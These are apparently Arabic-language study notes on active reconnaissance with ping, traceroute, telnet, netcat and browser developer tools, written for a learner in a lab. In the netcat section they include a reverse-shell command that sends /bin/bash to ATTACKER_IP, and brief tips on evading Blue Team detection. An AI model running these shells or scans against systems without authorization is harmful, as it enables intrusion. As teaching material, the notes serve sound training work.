
# 🔎 الفرق بين Passive و Active Reconnaissance

## 🟢 Passive Reconnaissance

- بدون أي تواصل مباشر مع الهدف
    
- مفيش Logs هتتسجل عنده
    
- مثال:
    
    - البحث في Google
        
    - OSINT
        
    - WHOIS lookup من مصادر عامة
        

أنت بتراقب من بعيد 👀

---

## 🔴 Active Reconnaissance

- فيه اتصال مباشر بالهدف
    
- بيتسجل في الـ Logs
    
- ممكن يظهر IP بتاعك
    
- أمثلة:
    
    - زيارة الموقع
        
    - `ping`
        
    - `traceroute`
        
    - `telnet`
        
    - `nc`
        
    - Port scanning
        

أنت كأنك بتخبط على الباب 🚪

---

# 🛠 الأدوات المذكورة وليه تعتبر Active Recon

## 1️⃣ Web Browser (مع Developer Tools)

لما تدخل موقع:

- بتعمل TCP connection
    
- بيظهر IP بتاعك في server logs
    
- تقدر تشوف:
    
    - Requests
        
    - Headers
        
    - Cookies
        
    - JS files
        
    - API endpoints
        

### مثال عملي:

- افتح الموقع
    
- F12 → Network tab
    
- شوف:
    
    - hidden endpoints
        
    - technologies used
        
    - server response headers
        

وده Active لأنك اتصلت فعليًا بالسيرفر.

---

## 2️⃣ ping

ping target.com

- بيبعت ICMP Echo Request
    
- السيرفر يرد Echo Reply
    
- بيكشف:
    
    - هل السيرفر شغال؟
        
    - latency
        

ده اتصال مباشر → Active Recon

---

## 3️⃣ traceroute

traceroute target.com

- بيحدد الطريق للشبكة
    
- بيكشف:
    
    - عدد hops
        
    - intermediate routers
        
    - network topology جزئيًا
        

برضه Active لأنك بتبعت packets فعلًا.

---

## 4️⃣ telnet

telnet target.com 80

- بيحاول يفتح connection على بورت معين
    
- تقدر تشوف:
    
    - هل البورت مفتوح؟
        
    - service banner
        

مثال:

telnet target.com 22

لو ظهرلك SSH banner → يبقى SSH شغال

---

## 5️⃣ netcat (nc)

أداة أقوى من telnet

nc -nv target.com 80

تقدر تستخدمها في:

- Port scanning
    
- Banner grabbing
    
- Manual HTTP requests
    

---

# ⚠️ ليه لازم Authorization؟

لأن أي:

- Port scan
    
- Service enumeration
    
- Direct probing
    

ممكن يعتبر:

> Unauthorized access attempt

حتى لو مجرد تجربة.

وده مهم جدًا في حياتك المهنية يا محمود خصوصًا لو ناوي تدخل Red Team رسمي.

---

# 🧠 ليه Active Recon مهم؟

في شغل الـ Pentesting:

1. Passive → أجمع معلومات
    
2. Active → أتحقق وأكتشف خدمات
    
3. Exploitation → أستغل الثغرات
    

من غير Active Recon:

- مش هتعرف الخدمات المفتوحة
    
- مش هتعرف ال versions
    
- مش هتعرف attack surface الحقيقي



# 🏓 Ping – الفكرة ببساطة

Ping زي لعبة **Ping Pong**:

- تبعت Echo Request
    
- تستنى Echo Reply
    

لو رجعلك رد → الهدف Online  
لو مفيش رد → فيه مشكلة (بس مش شرط يكون السيرفر واقع 👀)

---

# 📡 Ping بيشتغل إزاي؟

Ping بيستخدم بروتوكول:

> **ICMP (Internet Control Message Protocol)**

- Type 8 → Echo Request
    
- Type 0 → Echo Reply
    

يعني مش TCP ولا UDP  
وده مهم جدًا في الفهم الأمني 👌

---

# 🖥 مثال عملي على AttackBox

## إرسال 5 باكيت بس:

ping -c 5 10.113.161.66

لو ظهر:

5 packets transmitted, 5 received, 0% packet loss

يبقى:

- الجهاز شغال
    
- الشبكة شغالة
    
- مفيش Firewall بيمنع ICMP
    

---

# 📊 قراءة Output مهم جدًا

مثال:

ttl=64 time=0.636 ms

### 🔹 time

ده الـ latency  
كل ما الرقم أقل → الشبكة أسرع

### 🔹 TTL

ده مهم جدًا في الـ Recon 👇

- TTL=64 غالبًا Linux
    
- TTL=128 غالبًا Windows
    
- TTL=255 غالبًا Network device
    

⚠️ مش قاعدة ثابتة 100%  
بس Indicator مفيد جدًا في OS Fingerprinting الأولي

وده مرتبط بخبرتك في الشبكات يا محمود 👌

---

# ❌ لو مفيش رد

مثال:

Destination Host Unreachable  
100% packet loss

ده معناه واحد من دول:

1️⃣ الجهاز مقفول  
2️⃣ الكابل مفصول  
3️⃣ فيه Router مش عارف يوصل  
4️⃣ Firewall بيمنع ICMP  
5️⃣ Windows Firewall (بيمنع Ping افتراضيًا)

⚠️ مهم جدًا:  
عدم الرد ≠ الجهاز مش موجود

ممكن يكون:

- Firewall مانع ICMP
    
- IDS/IPS عامل Drop
    

وده خطأ شائع عند المبتدئين في الـ Pentesting.

---

# 🔎 ليه Ping يعتبر Active Recon؟

لأنك:

- بتبعت Packet فعلي
    
- بيظهر IP بتاعك
    
- بيتسجل في Logs
    
- بتختبر Availability
    

وده أول خطوة قبل:

- Port Scanning
    
- Service Enumeration
    
- Vulnerability Scanning
    

---

# 🎯 استخدام Ping في الـ Pentesting Flow

1️⃣ هل الهدف Online؟  
2️⃣ هل ICMP مفتوح؟  
3️⃣ تقدير latency  
4️⃣ مبدئيًا تخمين OS من TTL

بعدها تروح على:

nmap target


# 🧭 Traceroute – الفكرة الأساسية

Traceroute بيجاوب على سؤال مهم جدًا:

> الباكيت بتمشي من عندي لحد الهدف عن طريق كام Router؟ وبيعدّي على مين؟

يعني بيكشف:

- عدد الـ hops
    
- IP بتاع كل Router في الطريق
    
- زمن الوصول لكل hop
    

---

# ⚙️ بيشتغل إزاي تقنيًا؟

بيعتمد على حاجة اسمها:

> TTL – Time To Live

رغم الاسم، هو **عدد hops مش وقت**.

### آلية العمل:

1️⃣ يبعث باكيت TTL=1

- أول Router يقللها لـ 0
    
- يرمي الباكيت
    
- يرد ICMP Time Exceeded  
    → كده عرفنا أول Router
    

2️⃣ يبعث TTL=2

- توصل للثاني
    
- يرميها
    
- يرد ICMP  
    → عرفنا الثاني
    

وهكذا…

---

# 🖥 الاستخدام

### على Linux / AttackBox:

traceroute 10.113.161.66

### على Windows:

tracert 10.113.161.66

---

# 📊 قراءة Output مهم جدًا

مثال من اللي انت بعته:

12  99.83.69.207  17.603 ms 15.827 ms 17.351 ms

ده معناه:

- hop رقم 12
    
- IP بتاعه 99.83.69.207
    
- 3 محاولات بزمن مختلف
    

---

### النجمة `*` معناها إيه؟

3  * 100.66.16.176  8.006 ms *

النجمة معناها:

- Router مردش
    
- أو Firewall مانع ICMP
    
- أو Packet Lost
    

وده طبيعي جدًا في بيئات Cloud.

---

# 🔄 ليه المسار بيتغير؟

انت لاحظت:

- مرة 14 hop
    
- مرة 26 hop
    

ده بسبب:

- Dynamic Routing Protocols
    
- Load balancing
    
- Cloud infrastructure
    

ودي حاجة مهمة جدًا في فهم Network Behavior.

---

# 🔥 من منظور Pentesting

Traceroute بيساعدك في:

## 1️⃣ Network Mapping

تعرف:

- في كام hop
    
- فيه segmentation؟
    
- فيه NAT layers؟
    

## 2️⃣ Identify Public Infrastructure

بعض IPs:

- AWS
    
- Cloudflare
    
- ISP Routers
    

ممكن تستفيد منها في:

- Scope validation
    
- Recon على Infrastructure
    

---

# ⚠️ مهم جدًا

مش كل Router بيرد.

بعض الأجهزة:

- معمولة hardening
    
- مانعة ICMP Time Exceeded
    
- مخفية عمدًا
    

---

# 🎯 ليه Traceroute يعتبر Active Recon؟

لأنك:

- بتبعت Packets مباشرة
    
- بتجبر Routers يردوا
    
- بتكشف Network topology
    
- بيتسجل في Logs
    

يعني مش Passive خالص.

---

# 🧠 مقارنة سريعة بين Ping و Traceroute

|Feature|Ping|Traceroute|
|---|---|---|
|بيكشف Online؟|✅|❌|
|بيكشف hops؟|❌|✅|
|بيعتمد على TTL؟|لا|✅|
|Active Recon؟|✅|✅|

---

# 💡 معلومة متقدمة ليك

في بيئات احترافية:

- بعض Red Teams تستخدم:
    
    traceroute -T
    
    (TCP-based traceroute)
    

عشان:

- تتفادى ICMP filtering
    
- تعدي Firewall rules




---------------------------------------------------------------------------

# 📞 Telnet – الفكرة الأساسية

**Telnet** اختصار لـ:

> **TELecommunication NETwork**

اتعمل سنة 1969 علشان:

- تدخل على جهاز Remote
    
- تشتغل عليه من خلال CLI
    

🔌 الـ Default Port:

23/TCP

---

# ⚠️ المشكلة الأمنية في Telnet

Telnet بيبعت:

- Username
    
- Password
    
- Commands
    

كلهم **Cleartext**

يعني أي حد عامل Sniffing (Wireshark مثلاً) يقدر يشوف الباسورد بسهولة 😬

عشان كده البديل الآمن هو:

> **SSH**

اللي بيشتغل Encryption كامل للـ Session.

---

# 💡 ليه بنتعلم Telnet في Pentesting؟

مش علشان نستخدمه Remote Admin  
لكن علشان:

> 🔥 Banner Grabbing  
> 🔥 Manual Service Interaction  
> 🔥 Testing Open Ports

لأن Telnet بيعتمد على TCP  
فممكن تتصل بأي TCP Service.

---

# 🧪 مثال عملي – Web Server

## الاتصال بالبورت 80:

telnet 10.113.161.66 80

لو Connected ✅  
يبقى البورت مفتوح.

---

## إرسال HTTP Request يدويًا:

GET / HTTP/1.1  
host: telnet  

⚠️ مهم تضغط Enter مرتين.

---

## الرد المهم هنا 👇

Server: nginx/1.6.2

ده اسمه:

> 🔎 Banner

ومن هنا عرفنا:

- نوع السيرفر: nginx
    
- الإصدار: 1.6.2
    

---

# 🎯 ليه ده مهم جدًا؟

لأنك دلوقتي تقدر:

1️⃣ تبحث عن CVEs خاصة بالإصدار ده  
2️⃣ تشوف لو فيه Exploits  
3️⃣ تعمل Version-based attack

ودي خطوة أساسية في Enumeration.

---

# 📬 مثال مع Mail Server

لو اتصلت بـ:

telnet target 25

هتشوف Banner خاص بـ SMTP  
وهتقدر تكتب أوامر زي:

HELO test

كل بروتوكول له أوامره الخاصة.

---

# 🔥 ليه Telnet يعتبر Active Recon؟

لأنك:

- بتفتح TCP connection
    
- بتكشف service
    
- بتسحب banner
    
- بتظهر في logs
    

ده مش Passive خالص.

---

# 🧠 مقارنة سريعة

|Tool|بيستخدم|الهدف|
|---|---|---|
|Ping|ICMP|Online check|
|Traceroute|ICMP/UDP|Network path|
|Telnet|TCP|Service interaction|

---

# 💀 نقطة احترافية ليك

كتير من الشركات بتقفل:

- Telnet service
    
- Banner disclosure
    

عشان تمنع:

- Version fingerprinting
    
- Automated exploitation
    

---

# 🏁 خلاصة 

Telnet:

- يعمل على TCP
    
- يستخدم Port 23 افتراضيًا
    
- غير مشفر
    
- يمكن استخدامه لعمل Banner Grabbing
    
- يعتبر Active Recon لأنه يتطلب اتصال مباشر



--------------------------------------------------------------------------------

# 🐱 Netcat (nc) – “Swiss Army Knife” بتاعة الشبكات

Netcat أداة مرعبة في بساطتها 👌  
تقدر تستخدمها:

- TCP Client
    
- TCP Server
    
- UDP Client
    
- UDP Server
    
- Banner Grabbing
    
- Port Testing
    
- Reverse Shells
    
- File Transfer
    

---

# 🔎 1️⃣ Banner Grabbing باستخدام nc

زي ما عملنا في Telnet 👇

nc 10.113.161.66 80

وبعدين:

GET / HTTP/1.1  
host: netcat  

🔑 النتيجة المهمة:

Server: nginx/1.6.2

عرفنا:

- نوع السيرفر
    
- الإصدار
    
- ممكن نبحث عن CVEs
    

---

# ⚡ الفرق بين Telnet و Netcat

||Telnet|Netcat|
|---|---|---|
|TCP|✅|✅|
|UDP|❌|✅|
|Listen mode|❌|✅|
|Reverse shell|❌|✅|
|مرن جدًا|❌|🔥 جدًا|

---

# 🖥 2️⃣ استخدام Netcat كسيرفر (Listen Mode)

على الجهاز السيرفر:

nc -vnlp 1234

شرح الخيارات:

|Option|المعنى|
|---|---|
|-l|Listen|
|-p|Port|
|-n|بدون DNS|
|-v|Verbose|
|-k|يفضل شغال بعد disconnect|

⚠️ لو البورت أقل من 1024 → محتاج root

---

# 🧑‍💻 3️⃣ الاتصال من Client

من جهاز تاني:

nc 10.113.161.66 1234

أي حاجة تكتبها هنا:

- تظهر على السيرفر
    
- والعكس صحيح
    

ده TCP tunnel بسيط جدًا.

---

# 🔥 ليه Netcat مهم في Pentesting؟

## 1️⃣ اختبار البورتات

nc -zv target 80

- -z → scanning mode
    
- -v → verbose
    

يعرفك:

- البورت مفتوح ولا لا
    

---

## 2️⃣ Reverse Shell (مهم جدًا)

سيرفر (المهاجم):

nc -lvnp 4444

الهدف المصاب:

nc ATTACKER_IP 4444 -e /bin/bash

كده أخدت Shell 🔥

⚠️ طبعًا ده في بيئة اختبار فقط.

---

## 3️⃣ نقل ملفات

إرسال:

nc -vnlp 1234 < file.txt

استقبال:

nc target 1234 > received.txt

---

# 🧠 من منظور Active Recon

Netcat يعتبر Active Recon لأنه:

- بيفتح اتصال مباشر
    
- بيختبر Services
    
- بيسحب Banners
    
- ممكن يعمل Port scanning
    
- بيظهر في logs
    

---

# 📊 مقارنة نهائية بين الأدوات الأربعة

|Tool|Protocol|الاستخدام|
|---|---|---|
|Ping|ICMP|هل الهدف Online|
|Traceroute|ICMP/UDP|مسار الشبكة|
|Telnet|TCP|Banner grabbing|
|Netcat|TCP/UDP|كل حاجة تقريبًا 🔥|

---

# 💀 نقطة احترافية 

في البيئات المتقدمة:

- Blue Team يراقب:
    
    - Outbound connections على بورتات غريبة
        
    - Netcat patterns
        
    - Suspicious listeners
        
- Red Team:
    
    - يغير البورت
        
    - يستخدم encryption wrappers
        
    - يستخدم Socat بدل nc
        

---

# 🏁 خلاصة 

Netcat:

- يدعم TCP و UDP
    
- يمكن استخدامه كـ client أو server
    
- مفيد في banner grabbing
    
- يمكن استخدامه في port scanning
    
- يعتبر Active Recon لأنه يتطلب اتصال مباشر





------------------------------------------------------------------------------


# 🧠 الصورة الكاملة – Active Recon Workflow

فكر فيها كده 👇

## 1️⃣ هل الهدف شغال أصلاً؟

ping -c 5 TARGET

✔️ بيرد → نكمل  
❌ مش بيرد → ممكن Firewall أو ICMP مقفول

---

## 2️⃣ الطريق ماشي إزاي؟

traceroute TARGET

✔️ نعرف:

- عدد الـ hops
    
- بنعدي على Cloud؟ ISP؟
    
- فيه segmentation؟
    

---

## 3️⃣ إيه البورتات اللي مفتوحة؟

telnet TARGET PORT

أو

nc -zv TARGET PORT

✔️ لو Connected → البورت مفتوح  
❌ لو Refused → مقفول

---

## 4️⃣ نسحب Banner

nc TARGET 80

ونكتب:

GET / HTTP/1.1  
host: test  

ونشوف:

Server: nginx/1.6.2

كده عرفنا:

- نوع السيرفر
    
- الإصدار
    
- نبدأ CVE research
    

---

# 📊 ملخص الأدوات

|الأداة|الهدف|البروتوكول|لماذا Active؟|
|---|---|---|---|
|ping|هل Online؟|ICMP|اتصال مباشر|
|traceroute|مسار الشبكة|ICMP/UDP|يكشف hops|
|telnet|اختبار بورت|TCP|اتصال مباشر|
|netcat|فحص وتفاعل|TCP/UDP|اتصال مباشر|
|Browser|تحليل Web|TCP 80/443|يسجل في logs|

---

# 🌐 سلاح خطير: Web Browser

المتصفح مش بس تصفح 👀  
هو Recon Framework كامل لو استخدمت:

### فتح Developer Tools

|OS|الاختصار|
|---|---|
|Windows / Linux|Ctrl + Shift + I|
|macOS|Option + Command + I|

تقدر تشوف:

- Requests
    
- Cookies
    
- Headers
    
- JS files
    
- Hidden APIs
    
- Server type
    

والميزة:

> شكلك مستخدم عادي  
> مش ماسك nmap 😂

ودي نقطة Red Team مهمة جدًا.

---

# 🛠 سكريبت بدائي يجمع الأدوات

مثال بسيط:

`#!/bin/bash`  
  
`target=$1`  
  
`echo "==== Ping Test ===="`  
`ping -c 3 $target`  
  
`echo "==== Traceroute ===="`  
`traceroute $target`  
  
`echo "==== Port Check (80, 443, 22) ===="`  
`for port in 80 443 22`  
`do`  
    `nc -zv $target $port`  
`done`

ده Scanner بدائي جدًا  
بس يوريك الفكرة.

---

# 🚀 ليه كل ده مهم قبل Nmap؟

لأن:

- بتفهم الشبكة بدل ما تعتمد على Tool
    
- بتفهم TTL
    
- بتفهم ICMP behavior
    
- بتفهم TCP handshake
    
- بتفهم Banner grabbing يدوي
    

وده يخليك Pentester فاهم مش Script Kiddie 🔥

---

# 🎯 ربط الموضوع بمستواك

بما إنك:

- معاك CCNA
    
- مهتم Cybersecurity
    
- شغال على Wazuh وFIM
    

ففهم الأدوات اليدوية دي مهم جدًا ليك علشان:

- تبني Detection rules
    
- تفهم Logs
    
- تعرف Red Team بيشتغل إزاي
    
- تميز Traffic طبيعي من مشبوه
    

---

# 🏁 الخلاصة النهائية

كل الأدوات دي تعتبر **Active Reconnaissance** لأنها:

- تتطلب اتصال مباشر
    
- تترك Logs
    
- تكشف معلومات عن الهدف
    
- يمكن رصدها من Blue Team